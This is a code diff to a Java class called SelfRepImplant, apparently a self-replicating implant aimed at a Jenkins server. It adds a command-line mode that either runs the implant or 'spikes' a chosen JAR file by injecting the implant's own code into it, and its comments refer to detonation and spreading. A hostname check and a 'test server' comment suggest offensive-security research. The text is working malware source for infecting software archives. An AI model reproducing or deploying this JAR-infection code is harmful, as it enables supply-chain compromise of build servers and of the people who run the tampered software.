@@ -100,14 +100,43 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
 
     // Make it executable. This is just relevant for the initial detonation. It's not required for further spreading.
     public static void main(String[] args) {
-        init();
+        if (args.length < 1) {
+            System.err.println("Usage: [ --all | <path-to-target-jar> ]");
+            System.exit(1);
+        }
+
+        if (args[0].equals("--all")) {
+            // Run the implant right here, right now.
+            init();
+        } else {
+            // Just spike a specific JAR.
+            Path targetJar = Path.of(args[0]);
+            if (!Files.exists(targetJar)) {
+                System.out.println("[!] Target file '" + targetJar + "' does not exist. Aborting.");
+                System.exit(1);
+            }
+
+            ImplantHandler implantHandler;
+            try {
+                implantHandler = ImplantHandlerImpl.findAndCreateFor(SelfRepImplant.class);
+            } catch (ClassNotFoundException | ImplantException | IOException e) {
+                System.out.println("[!] Cannot load oneself. Aborting.");
+                throw new RuntimeException("Cannot load oneself");
+            }
+
+            try {
+                jarPlant(implantHandler, targetJar);
+            } catch (IOException e) {
+                System.out.println("[!] Failed to spike JAR '" + targetJar + "'.");
+            }
+        }
     }
 
     public static void payload() {
         Optional<String> hostname = getHostname();
         if (hostname.isEmpty() || !hostname.get().equals(CONF_TARGET_HOSTNAME)) {
             // Don't accidentally explode somewhere other than the test server
-            System.out.println("Not inside Jenkins? Aborting.");
+            System.out.println("[-] Not inside Jenkins? Aborting.");
             return;
         }
 
